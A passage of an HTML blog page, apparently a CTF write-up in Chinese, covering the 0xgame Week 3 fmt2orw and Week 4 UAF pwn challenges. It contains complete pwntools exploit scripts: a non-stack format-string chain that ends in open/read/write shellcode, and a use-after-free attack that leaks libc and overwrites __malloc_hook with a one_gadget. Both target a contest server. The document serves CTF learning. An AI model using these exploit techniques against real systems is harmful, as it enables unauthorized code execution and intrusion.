+payload1 += shellcraft.amd64.read(3,addr,0x30)
+payload1 += shellcraft.amd64.write(1,addr,0x30)
+io.send(asm(payload1))
+io.interactive()               
+</code></pre><h4 id="week-3-fmt2orw">[Week 3] fmt2orw</h4>
+<p>主函数逻辑
+<img src="../images/21.png" alt="logo"></p>
+<p>say()：
+<img src="../images/22.png" alt="logo"></p>
+<p>seccomp规则：只允许open，read，write，mprotect</p>
+<p>所以这题该怎么打呢。。。原来是非栈上格式化字符串，具体知识点就不介绍了，非栈上格式化字符串还是很好理解的，就是没法任意地址写和任意地址读。</p>
+<p>这题需要做的是orw，但是buf又没执行权限，但是我们看到程序里有：</p>
+<p><img src="../images/23.png" alt="logo"></p>
+<p>但是这题开了pie，因此做题步骤就很清晰了：</p>
+<p>先搭链子==&gt;泄露main地址==&gt;把ret_addr改为what_addr==&gt;把下一个字节改为shellcode的地址，最后直接传入stop + shellcode达成攻击，exp如下：</p>
+<pre tabindex="0"><code>from pwn import *
+#io = process(&#39;./fmt2&#39;)
+io = remote(&#39;47.97.58.52&#39;,43000)
+context(os = &#39;linux&#39;,arch = &#39;amd64&#39;,log_level = &#39;debug&#39;)
+io.sendafter(b&#39;Say something:&#39;,b&#39;%11$p&#39;)
+io.recvuntil(b&#39;Shanghai!\n0x&#39;)
+addr = int(io.recvuntil(b&#39;Shanghai!\n&#39;,drop=True).decode(),16)
+ret_a = addr - 0xe08 + 0xd08
+print(hex(ret_a))
+io.sendafter(b&#39;Say something:&#39;,b&#39;%7$p&#39;)
+io.recvuntil(b&#39;Shanghai!\n0x&#39;)
+addr = int(io.recv(12).decode(),16)
+what = addr - 0x50 -0x151 +  0xA3
+print(hex(what))
+payload1 = b&#39;%&#39; + str(ret_a &amp; 0xffff).encode() + b&#39;c%11$hn&#39; + b&#39;\x00&#39;
+#gdb.attach(io)
+#pause()
+io.sendafter(b&#39;Say something:&#39;,payload1)
+#0x27 = 39
+payload0 = b&#39;%&#39; + str(what &amp; 0xffff).encode() + b&#39;c%39$hn&#39; + b&#39;\x00&#39;
+io.sendafter(b&#39;Say something:&#39;,payload0)
+
+payload1 = b&#39;%&#39; + str(ret_a+8 &amp; 0xffff).encode() + b&#39;c%11$hn&#39; + b&#39;\x00&#39;
+io.sendafter(b&#39;Say something:&#39;,payload1)
+payload2 = b&#39;%&#39; + str(0x4010).encode() + b&#39;c%39$hn&#39; + b&#39;\x00&#39;
+io.sendafter(b&#39;Say something:&#39;,payload2)
+payload3 = b&#39;%&#39; + str(ret_a+10 &amp; 0xffff).encode() + b&#39;c%11$hn&#39; + b&#39;\x00&#39;
+io.sendafter(b&#39;Say something:&#39;,payload3)
+payload4 = b&#39;%&#39; + str(0x1451).encode() + b&#39;c%39$hn&#39; + b&#39;\x00&#39;
+io.sendafter(b&#39;Say something:&#39;,payload4)
+payload5 = b&#39;%&#39; + str(ret_a+12 &amp; 0xffff).encode() + b&#39;c%11$hn&#39; + b&#39;\x00&#39;
+io.sendafter(b&#39;Say something:&#39;,payload5)
+payload6 = b&#39;%&#39; + str(0x0001).encode() + b&#39;c%39$hn&#39; + b&#39;\x00&#39;
+io.sendafter(b&#39;Say something:&#39;,payload6)
+
+get_shell = b&#39;stop\x00&#39;
+get_shell = get_shell.ljust(16,b&#39;\x00&#39;)
+addr = 0x114514170
+payload7 = shellcraft.amd64.open(&#34;./flag&#34;)
+payload7 += shellcraft.amd64.read(3,addr,0x30)
+payload7 += shellcraft.amd64.write(1,addr,0x30)
+payload7 = asm(payload7)
+get_shell = get_shell + payload7
+io.sendafter(b&#39;Say something:&#39;,get_shell)
+io.interactive()            
+</code></pre><p>总体来说，week3还是挺难的，但是还好就三道题，三天干掉嘿嘿嘿。</p>
+<h1 id="0xgame-week4">0xgame week4</h1>
+<h4 id="week-4-uaf">[Week 4] UAF</h4>
+<p><img src="../images/24.png" alt="logo"></p>
+<p>经典菜单题，没有后门函数，所以考虑用onegadget打malloc_hook</p>
+<p><img src="../images/26.png" alt="logo"></p>
+<p>dele函数有uaf漏洞</p>
+<p>直接通过unsorted bins泄露libc基址然后打uaf劫持malloc</p>
+<p>上代码</p>
+<pre tabindex="0"><code>from pwn import *
+#io = process(&#39;./uaf&#39;)
+io = remote(&#39;47.97.58.52&#39;,44000)
+libc = ELF(&#39;libc.so.6&#39;)
+context(os = &#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)
+def add(index,size,content):
+    io.sendafter(b&#39;&gt;&gt; &#39;,b&#39;1&#39;)
+    io.sendafter(b&#39;Enter index: &#39;,str(index).encode())
+    io.sendafter(b&#39;Enter size: &#39;,str(size).encode())
+    io.sendafter(b&#39;Enter data: &#39;,content)
+def dele(index):
+    io.sendafter(b&#39;&gt;&gt; &#39;,b&#39;2&#39;)
+    io.sendafter(b&#39;Enter index: &#39;,str(index).encode())
+def show(index):
+    io.sendafter(b&#39;&gt;&gt; &#39;,b&#39;3&#39;)
+    io.sendafter(b&#39;Enter index: &#39;,str(index).encode())
+def edit(index,content):
+    io.sendafter(b&#39;&gt;&gt; &#39;,b&#39;4&#39;)
+    io.sendafter(b&#39;Enter index: &#39;,str(index).encode())
+    io.sendafter(b&#39;Enter data: &#39;,content)
+add(8,0x100,p64(0))
+for i in range(7):
+   add(i,0x100,p64(0))
+for i in range(7):
+   dele(i)
+dele(8)
+#gdb.attach(io)
+#pause()
+show(8)
+io.recvuntil(b&#39;Data: &#39;)
+addr = u64(io.recvuntil(b&#39;\n&#39;,drop = True).ljust(8,b&#39;\x00&#39;))
+libc_base = addr - 0x7d43a8121be0 + 0x7d43a7f35000
+print(hex(libc_base))
+malloc_hook = libc_base + libc.symbols[&#39;__malloc_hook&#39;]
+add(9,0x70,p64(0))
+add(10,0x70,p64(0))
+add(11,0x70,p64(0))
+dele(9)
+dele(10)
+dele(11)
+edit(11,p64(malloc_hook))
+gadget1 = libc_base + 0xe3afe
+gadget2 = libc_base + 0xe3b01
+add(12,0x70,b&#39;12&#39;)
+add(13,0x70,p64(gadget2))
+print(hex(malloc_hook))
+print(hex(gadget1))
+#gdb.attach(io)
+#pause()
+io.sendafter(b&#39;&gt;&gt; &#39;,b&#39;1&#39;)
+io.sendafter(b&#39;Enter index: &#39;,b&#39;14&#39;)
+io.sendafter(b&#39;Enter size: &#39;,b&#39;0x70&#39;)
+io.interactive()
+</code></pre></article>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+</div>
+<script type="application/javascript" src='https://ret2ldz.github.io/js/toc.js'></script>
+<link rel="stylesheet" href='https://ret2ldz.github.io/css/toc.css' />
+
+  
+<div id="gitalk-container" class="gitalk-container"></div>
+<link rel="stylesheet" href='https://ret2ldz.github.io/css/gitalk.css'>
+<script src='https://ret2ldz.github.io/js/gitalk.min.js'></script>
+<script>
+  const gitalk = new Gitalk({
+    clientID: 'Your client ID',
+    clientSecret: 'Your client secret',
+    repo: 'ret2ldz.github.io',
+    owner: 'ventusoon',
+    admin: ['ventusoon'],
+    id: eval("location.pathname"), 
+    distractionFreeMode: false 
+  });
+  (function() {
+    gitalk.render('gitalk-container');
+  })();
+</script>
+
+</div>
+
+  <div class="footer container-xl width-full p-responsive">
+  <div
+    class="position-relative d-flex flex-row-reverse flex-lg-row flex-wrap flex-lg-nowrap flex-justify-center flex-lg-justify-between flex-sm-items-center pt-6 pb-2 mt-6 f6 text-gray border-top border-gray-light ">
+    <a aria-label="Homepage" title="GitHub" class="footer-octicon d-none d-lg-block mr-lg-4" href="https://ret2ldz.github.io/">
+      <svg height="24" class="octicon octicon-mark-github" viewBox="0 0 16 16" version="1.1" width="24">
+        <path fill-rule="evenodd"
+          d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z">
+        </path>
+      </svg>
+    </a>
+    <ul class="list-style-none d-flex flex-wrap col-12 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0">
+      
+      <li class="mr-3 mr-lg-0">Theme by <a href='https://github.com/MeiK2333/github-style'>github-style</a></li>
+      
+      <li class="mr-3 mr-lg-0">GitHub and the Invertocat logo are trademarks of <a href="https://github.com/">GitHub, Inc.</a></li>
+    </ul>
+  </div>
+  <div class="d-flex flex-justify-center pb-6">
+    <span class="f6 text-gray-light"></span>
+  </div>
+
+
+</div>
+
+</body>
+
+<script type="application/javascript" src="https://ret2ldz.github.io/js/github-style.js"></script>
+
+
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/fuse.js/dist/fuse.min.js"></script>
+<script type="application/javascript" src='https://ret2ldz.github.io/js/search.js'></script>
+
+
+
+</html>
